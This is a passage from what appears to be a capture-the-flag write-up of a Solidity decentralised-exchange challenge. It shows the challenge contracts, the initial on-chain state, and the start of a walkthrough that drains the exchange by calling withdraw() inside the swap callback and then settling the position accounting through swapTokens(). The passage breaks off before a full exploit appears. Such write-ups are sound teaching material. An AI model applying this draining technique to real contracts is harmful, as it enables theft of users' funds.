</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>Pool)) </span><span style=color:#a71d5d;font-weight:700>private</span><span> pools;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>() {
</span><span>        admin </span><span style=color:#a71d5d;font-weight:700>= msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>addToken</span><span>(</span><span style=color:#0086b3>address </span><span>token) </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender ==</span><span> admin, </span><span style=color:#183691>"not admin"</span><span>);
</span><span>        allowedTokens[token] </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>modifier </span><span style=color:#62a35c>duringSwap</span><span>() {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(swapStates[nonce].hasBegun, </span><span style=color:#183691>"swap not in progress"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>_;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getSwapState</span><span>() </span><span style=color:#a71d5d;font-weight:700>internal view returns </span><span>(SwapState storage) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> swapStates[nonce];
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getPool</span><span>(</span><span style=color:#0086b3>address </span><span>tokenA, </span><span style=color:#0086b3>address </span><span>tokenB)
</span><span>        </span><span style=color:#a71d5d;font-weight:700>internal
</span><span>        </span><span style=color:#a71d5d;font-weight:700>view
</span><span>        </span><span style=color:#a71d5d;font-weight:700>returns </span><span>(</span><span style=color:#0086b3>address</span><span> left, </span><span style=color:#0086b3>address</span><span> right, Pool storage pool)
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(tokenA </span><span style=color:#a71d5d;font-weight:700>!=</span><span> tokenB);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(tokenA </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span> tokenB) {
</span><span>            left </span><span style=color:#a71d5d;font-weight:700>=</span><span> tokenA;
</span><span>            right </span><span style=color:#a71d5d;font-weight:700>=</span><span> tokenB;
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            left </span><span style=color:#a71d5d;font-weight:700>=</span><span> tokenB;
</span><span>            right </span><span style=color:#a71d5d;font-weight:700>=</span><span> tokenA;
</span><span>        }
</span><span>
</span><span>        pool </span><span style=color:#a71d5d;font-weight:700>=</span><span> pools[left][right];
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getReserves</span><span>(</span><span style=color:#0086b3>address </span><span>token, </span><span style=color:#0086b3>address </span><span>other) </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        (</span><span style=color:#0086b3>address</span><span> left,, Pool </span><span style=color:#a71d5d;font-weight:700>storage </span><span>pool) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getPool</span><span>(token, other);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> token </span><span style=color:#a71d5d;font-weight:700>==</span><span> left </span><span style=color:#a71d5d;font-weight:700>?</span><span> pool.leftReserves </span><span style=color:#a71d5d;font-weight:700>:</span><span> pool.rightReserves;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setReserves</span><span>(</span><span style=color:#0086b3>address </span><span>token, </span><span style=color:#0086b3>address </span><span>other, </span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
</span><span>        (</span><span style=color:#0086b3>address</span><span> left,, Pool </span><span style=color:#a71d5d;font-weight:700>storage </span><span>pool) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getPool</span><span>(token, other);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(token </span><span style=color:#a71d5d;font-weight:700>==</span><span> left) pool.leftReserves </span><span style=color:#a71d5d;font-weight:700>=</span><span> amount;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>else</span><span> pool.rightReserves </span><span style=color:#a71d5d;font-weight:700>=</span><span> amount;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getLiquidity</span><span>(</span><span style=color:#0086b3>address </span><span>left, </span><span style=color:#0086b3>address </span><span>right) </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        (,, Pool </span><span style=color:#a71d5d;font-weight:700>storage </span><span>pool) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getPool</span><span>(left, right);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> pool.leftReserves </span><span style=color:#a71d5d;font-weight:700>*</span><span> pool.rightReserves;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>addLiquidity</span><span>(</span><span style=color:#0086b3>address </span><span>left, </span><span style=color:#0086b3>address </span><span>right, </span><span style=color:#0086b3>uint256 </span><span>amountLeft, </span><span style=color:#0086b3>uint256 </span><span>amountRight) </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(allowedTokens[left], </span><span style=color:#183691>"token not allowed"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(allowedTokens[right], </span><span style=color:#183691>"token not allowed"</span><span>);
</span><span>
</span><span>        </span><span style=color:#62a35c>Token</span><span>(left).</span><span style=color:#62a35c>transferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), amountLeft);
</span><span>        </span><span style=color:#62a35c>Token</span><span>(right).</span><span style=color:#62a35c>transferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), amountRight);
</span><span>
</span><span>        </span><span style=color:#62a35c>setReserves</span><span>(left, right, </span><span style=color:#62a35c>getReserves</span><span>(left, right) </span><span style=color:#a71d5d;font-weight:700>+</span><span> amountLeft);
</span><span>        </span><span style=color:#62a35c>setReserves</span><span>(right, left, </span><span style=color:#62a35c>getReserves</span><span>(right, left) </span><span style=color:#a71d5d;font-weight:700>+</span><span> amountRight);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>swap</span><span>() </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        SwapState </span><span style=color:#a71d5d;font-weight:700>storage </span><span>swapState </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getSwapState</span><span>();
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>!</span><span>swapState.hasBegun, </span><span style=color:#183691>"swap already in progress"</span><span>);
</span><span>        swapState.hasBegun </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>
</span><span>        </span><span style=color:#62a35c>SwapCallback</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>).</span><span style=color:#62a35c>doSwap</span><span>();
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(swapState.unsettledTokens </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0, </span><span style=color:#183691>"not settled"</span><span>);
</span><span>        nonce </span><span style=color:#a71d5d;font-weight:700>+=</span><span> 1;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>updatePosition</span><span>(</span><span style=color:#0086b3>address </span><span>token, </span><span style=color:#0086b3>int256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(allowedTokens[token], </span><span style=color:#183691>"token not allowed"</span><span>);
</span><span>
</span><span>        SwapState </span><span style=color:#a71d5d;font-weight:700>storage </span><span>swapState </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getSwapState</span><span>();
</span><span>
</span><span>        </span><span style=color:#0086b3>int256</span><span> currentPosition </span><span style=color:#a71d5d;font-weight:700>=</span><span> swapState.positions[token];
</span><span>        </span><span style=color:#0086b3>int256</span><span> newPosition </span><span style=color:#a71d5d;font-weight:700>=</span><span> currentPosition </span><span style=color:#a71d5d;font-weight:700>+</span><span> amount;
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(newPosition </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) swapState.unsettledTokens </span><span style=color:#a71d5d;font-weight:700>-=</span><span> 1;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>else if </span><span>(currentPosition </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) swapState.unsettledTokens </span><span style=color:#a71d5d;font-weight:700>+=</span><span> 1;
</span><span>
</span><span>        swapState.positions[token] </span><span style=color:#a71d5d;font-weight:700>=</span><span> newPosition;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>withdraw</span><span>(</span><span style=color:#0086b3>address </span><span>token, </span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>public duringSwap </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(allowedTokens[token], </span><span style=color:#183691>"token not allowed"</span><span>);
</span><span>
</span><span>        </span><span style=color:#62a35c>Token</span><span>(token).</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, amount);
</span><span>        </span><span style=color:#62a35c>updatePosition</span><span>(token, </span><span style=color:#a71d5d;font-weight:700>-</span><span style=color:#0086b3>int256</span><span>(amount));
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>initiateTransfer</span><span>(</span><span style=color:#0086b3>address </span><span>token) </span><span style=color:#a71d5d;font-weight:700>public duringSwap </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(allowedTokens[token], </span><span style=color:#183691>"token not allowed"</span><span>);
</span><span>
</span><span>        SwapState </span><span style=color:#a71d5d;font-weight:700>storage </span><span>swapState </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getSwapState</span><span>();
</span><span>        SavedBalance </span><span style=color:#a71d5d;font-weight:700>storage </span><span>state </span><span style=color:#a71d5d;font-weight:700>=</span><span> swapState.savedBalances[token];
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>!</span><span>state.initiated, </span><span style=color:#183691>"transfer already initiated"</span><span>);
</span><span>
</span><span>        state.initiated </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>        state.balance </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Token</span><span>(token).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>finalizeTransfer</span><span>(</span><span style=color:#0086b3>address </span><span>token) </span><span style=color:#a71d5d;font-weight:700>public duringSwap </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(allowedTokens[token], </span><span style=color:#183691>"token not allowed"</span><span>);
</span><span>
</span><span>        SwapState </span><span style=color:#a71d5d;font-weight:700>storage </span><span>swapState </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getSwapState</span><span>();
</span><span>        SavedBalance </span><span style=color:#a71d5d;font-weight:700>storage </span><span>state </span><span style=color:#a71d5d;font-weight:700>=</span><span> swapState.savedBalances[token];
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(state.initiated, </span><span style=color:#183691>"transfer not initiated"</span><span>);
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> balance </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Token</span><span>(token).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>        </span><span style=color:#0086b3>uint256</span><span> amount </span><span style=color:#a71d5d;font-weight:700>=</span><span> balance </span><span style=color:#a71d5d;font-weight:700>-</span><span> state.balance;
</span><span>
</span><span>        state.initiated </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>false</span><span>;
</span><span>        </span><span style=color:#62a35c>updatePosition</span><span>(token, </span><span style=color:#0086b3>int256</span><span>(amount));
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>swapTokens</span><span>(</span><span style=color:#0086b3>address </span><span>tokenIn, </span><span style=color:#0086b3>address </span><span>tokenOut, </span><span style=color:#0086b3>uint256 </span><span>amountIn, </span><span style=color:#0086b3>uint256 </span><span>amountOut) </span><span style=color:#a71d5d;font-weight:700>public duringSwap </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(allowedTokens[tokenIn], </span><span style=color:#183691>"token not allowed"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(allowedTokens[tokenOut], </span><span style=color:#183691>"token not allowed"</span><span>);
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> liquidityBefore </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getLiquidity</span><span>(tokenIn, tokenOut);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(liquidityBefore </span><span style=color:#a71d5d;font-weight:700>></span><span> 0, </span><span style=color:#183691>"no liquidity"</span><span>);
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> newReservesIn </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getReserves</span><span>(tokenIn, tokenOut) </span><span style=color:#a71d5d;font-weight:700>+</span><span> amountIn;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> newReservesOut </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getReserves</span><span>(tokenOut, tokenIn) </span><span style=color:#a71d5d;font-weight:700>-</span><span> amountOut;
</span><span>
</span><span>        </span><span style=color:#62a35c>setReserves</span><span>(tokenIn, tokenOut, newReservesIn);
</span><span>        </span><span style=color:#62a35c>setReserves</span><span>(tokenOut, tokenIn, newReservesOut);
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> liquidityAfter </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getLiquidity</span><span>(tokenIn, tokenOut);
</span><span>
</span><span>        </span><span style=color:#62a35c>updatePosition</span><span>(tokenIn, </span><span style=color:#a71d5d;font-weight:700>-</span><span style=color:#0086b3>int256</span><span>(amountIn));
</span><span>        </span><span style=color:#62a35c>updatePosition</span><span>(tokenOut, </span><span style=color:#0086b3>int256</span><span>(amountOut));
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(liquidityAfter </span><span style=color:#a71d5d;font-weight:700>>=</span><span> liquidityBefore, </span><span style=color:#183691>"insufficient liquidity"</span><span>);
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Token </span><span>{
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> totalSupply;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>uint256</span><span>) balances;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>uint256</span><span>)) allowed;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_initialAmount) {
</span><span>        balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>=</span><span> _initialAmount;
</span><span>        totalSupply </span><span style=color:#a71d5d;font-weight:700>=</span><span> _initialAmount;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(</span><span style=color:#0086b3>address </span><span>_owner) </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> balances[_owner];
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>transfer</span><span>(</span><span style=color:#0086b3>address </span><span>_to, </span><span style=color:#0086b3>uint256 </span><span>_value) </span><span style=color:#a71d5d;font-weight:700>public returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>>=</span><span> _value);
</span><span>        balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>-=</span><span> _value;
</span><span>        balances[_to] </span><span style=color:#a71d5d;font-weight:700>+=</span><span> _value;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>transferFrom</span><span>(</span><span style=color:#0086b3>address </span><span>_from, </span><span style=color:#0086b3>address </span><span>_to, </span><span style=color:#0086b3>uint256 </span><span>_value) </span><span style=color:#a71d5d;font-weight:700>public returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(allowed[_from][msg.sender] </span><span style=color:#a71d5d;font-weight:700>>=</span><span> _value);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(balances[_from] </span><span style=color:#a71d5d;font-weight:700>>=</span><span> _value);
</span><span>        balances[_to] </span><span style=color:#a71d5d;font-weight:700>+=</span><span> _value;
</span><span>        balances[_from] </span><span style=color:#a71d5d;font-weight:700>-=</span><span> _value;
</span><span>        allowed[_from][msg.sender] </span><span style=color:#a71d5d;font-weight:700>-=</span><span> _value;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>approve</span><span>(</span><span style=color:#0086b3>address </span><span>_spender, </span><span style=color:#0086b3>uint256 </span><span>_value) </span><span style=color:#a71d5d;font-weight:700>public returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        allowed[msg.sender][_spender] </span><span style=color:#a71d5d;font-weight:700>=</span><span> _value;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>    }
</span><span>}
</span></code></pre></div></div><h2 id=solution-7>Solution</h2><p>What does this protocol is doing? Let's break it down<ol><li><p><strong>Setup Contract</strong></p> <ul><li>Initializes the exchange with initial liquidity<li>Creates three tokens (token1, token2, token3) with balances: <ul><li>token1: 300,000 tokens<li>token2: 300,000 tokens<li>token3: 600,000 tokens</ul><li>Adds initial liquidity pairs: <ul><li>token1/token2: 100,000 each<li>token1/token3: 100,000/200,000<li>token2/token3: 100,000/200,000</ul></ul><li><p><strong>Exchange Contract</strong></p> <ul><li>Core DEX functionality with unique swap mechanism<li>Key components: <ul><li><code>Pool</code>: Tracks reserves for token pairs<li><code>SwapState</code>: Manages ongoing swap states and positions<li><code>SavedBalance</code>: Tracks balance snapshots during swaps</ul><li>Main functions: <ul><li><code>addLiquidity()</code>: Add tokens to pools<li><code>swap()</code>: Initiates a swap transaction<li><code>swapTokens()</code>: Performs the actual token swap<li><code>withdraw()</code>: Withdraws tokens during a swap<li><code>initiateTransfer/finalizeTransfer</code>: Two-step transfer process</ul></ul></ol><p>As usual what's the initial state of the protocol??<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>Player :  0xa7048127553Ead5D0408B3C8C068565d1cD46BDb
</span><span>Setup :  0xd9beE8f7dF07fd718f54ed05CAD77FC0EF1F9A7B
</span><span>Exchange :  0xb3CE3E482D1caf5b444f3f6b95a9d8799f6dac11
</span><span>Token1 :  0xa95A2a693880626911bb521CB50b7DC7Caa0EC05
</span><span>Token2 :  0x601C3EA942c5Eae7301C39c95342307a17cEc0B7
</span><span>Token3 :  0xd5e4b9f37E1b51D18CD2f281B85DCDC07b4540a1
</span><span style=color:#795da3;font-weight:700>isSolved</span><span>() :  false
</span><span>Exchange balance Token1 :  200000
</span><span>Exchange balance Token2 :  200000
</span><span>Exchange balance Token3 :  400000
</span><span>Player balance Token1 :  0
</span><span>Player balance Token2 :  0
</span><span>Player balance Token3 :  0
</span></code></pre><p>Okay, Goal is to drain all tokens from the exchange. Lets do this.<p>We need to find the function where the token amount is being sent to us. It is the <code>withdraw()</code> function.<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>withdraw</span><span>(</span><span style=color:#0086b3>address </span><span>token, </span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>public duringSwap </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>require</span><span>(allowedTokens[token], </span><span style=color:#183691>"token not allowed"</span><span>);
</span><span>
</span><span>    </span><span style=color:#62a35c>Token</span><span>(token).</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, amount);
</span><span>    </span><span style=color:#62a35c>updatePosition</span><span>(token, </span><span style=color:#a71d5d;font-weight:700>-</span><span style=color:#0086b3>int256</span><span>(amount));
</span><span>}
</span></code></pre><p>The withdraw function is optimistically sending the amount we are requesting directly to the caller and then updating the position, but first of all the swap should begin (<code>duringSwap</code>). For this we can call <code>swap()</code> functions to start the swap.<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>swap</span><span>() </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>    SwapState </span><span style=color:#a71d5d;font-weight:700>storage </span><span>swapState </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getSwapState</span><span>();
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>!</span><span>swapState.hasBegun, </span><span style=color:#183691>"swap already in progress"</span><span>);
</span><span>    swapState.hasBegun </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>
</span><span>    </span><span style=color:#62a35c>SwapCallback</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>).</span><span style=color:#62a35c>doSwap</span><span>();
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>require</span><span>(swapState.unsettledTokens </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0, </span><span style=color:#183691>"not settled"</span><span>);
</span><span>    nonce </span><span style=color:#a71d5d;font-weight:700>+=</span><span> 1;
</span><span>}
</span></code></pre><p>If we call the <code>swap()</code> function it will callback the <code>doSwap()</code> function on the caller. So, Now we can call the <code>withdraw()</code> function inside the callback of <code>doSwap()</code>.<p>Let's see what happens if we withdraw all the <code>200000</code> tokens of <code>Token1</code>. The withdraw function will send all the <code>200000</code> token1 to us but it updates our position.<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span>withdraw( token1, </span><span style=color:#0086b3>200000 </span><span>) {
</span><span>    Token(token).transfer(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>200000</span><span>);
</span><span>    updatePosition(token1, </span><span style=color:#a71d5d;font-weight:700>-</span><span style=color:#0086b3>int256</span><span>(</span><span style=color:#0086b3>200000</span><span>));
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>updatePosition</span><span>(</span><span style=color:#0086b3>address </span><span>token, </span><span style=color:#0086b3>int256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>internal </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>require</span><span>(allowedTokens[token], </span><span style=color:#183691>"token not allowed"</span><span>);
</span><span>
</span><span>    SwapState </span><span style=color:#a71d5d;font-weight:700>storage </span><span>swapState </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getSwapState</span><span>();
</span><span>
</span><span>    </span><span style=color:#0086b3>int256</span><span> currentPosition </span><span style=color:#a71d5d;font-weight:700>=</span><span> swapState.positions[token];
</span><span>    </span><span style=color:#0086b3>int256</span><span> newPosition </span><span style=color:#a71d5d;font-weight:700>=</span><span> currentPosition </span><span style=color:#a71d5d;font-weight:700>+</span><span> amount;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(newPosition </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) swapState.unsettledTokens </span><span style=color:#a71d5d;font-weight:700>-=</span><span> 1;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>else if </span><span>(currentPosition </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) swapState.unsettledTokens </span><span style=color:#a71d5d;font-weight:700>+=</span><span> 1;
</span><span>
</span><span>    swapState.positions[token] </span><span style=color:#a71d5d;font-weight:700>=</span><span> newPosition;
</span><span>}
</span></code></pre><p>Now our newPosition becomes <code>200000</code> and the <code>swapState.unsettledTokens = 1</code> will be updated. So, we need to settle these <code>unsettledTokens</code> before completing this swap. If we observe the <code>swapTokens()</code> function where we can do swap and the positions are also being updated there.<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>swapTokens</span><span>(</span><span style=color:#0086b3>address </span><span>tokenIn, </span><span style=color:#0086b3>address </span><span>tokenOut, </span><span style=color:#0086b3>uint256 </span><span>amountIn, </span><span style=color:#0086b3>uint256 </span><span>amountOut) </span><span style=color:#a71d5d;font-weight:700>public duringSwap </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>require</span><span>(allowedTokens[tokenIn], </span><span style=color:#183691>"token not allowed"</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>require</span><span>(allowedTokens[tokenOut], </span><span style=color:#183691>"token not allowed"</span><span>);
</span><span>
</span><span>    </span><span style=color:#0086b3>uint256</span><span> liquidityBefore </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getLiquidity</span><span>(tokenIn, tokenOut);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>require</span><span>(liquidityBefore </span><span style=color:#a71d5d;font-weight:700>></span><span> 0, </span><span style=color:#183691>"no liquidity"</span><span>);
</span><span>
</span><span>    </span><span style=color:#0086b3>uint256</span><span> newReservesIn </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getReserves</span><span>(tokenIn, tokenOut) </span><span style=color:#a71d5d;font-weight:700>+</span><span> amountIn;
</span><span>    </span><span style=color:#0086b3>uint256</span><span> newReservesOut </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>getReserves</span><span>(tokenOut, tokenIn) </span><span style=color:#a71d5d;font-weight:700>-</span><span> amountOut;
</span><span>
</span><span>    </span><span style=color:#62a35c>setReserves</span><span>(tokenIn, tokenOut, newReservesIn);
